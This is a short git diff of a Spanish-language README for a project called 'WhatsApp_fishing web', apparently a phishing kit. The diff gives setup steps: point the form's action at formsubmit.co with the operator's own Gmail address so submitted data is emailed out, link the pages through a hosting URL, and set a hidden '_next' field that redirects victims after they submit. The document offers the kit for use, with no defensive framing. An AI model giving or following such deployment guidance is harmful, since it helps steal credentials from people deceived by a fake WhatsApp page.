@@ -13,4 +13,19 @@ WhatsApp_fishing web
 
 > efitar la sección de form donde se encuentra el username para remplazar por su correo
 >
-> form action="https://formsubmit.co/username@gmail.com" method="POST"
+```html
+ <form action="https://formsubmit.co/username@gmail.com" method="POST">
+```
+
+# enlace de archivos 
+
+> para enlazar el index.html y el código.html se tiene que proporcionar el link creado por el hosting
+>
+> se tiene que editar el redireciona para que apunte ala web se edita la siguiente sección
+
+```html
+<input type="hidden" name="_next" value="url_web">
+```
+# recursos
+
+> puedes utilizar los load implementado en los archivos :)
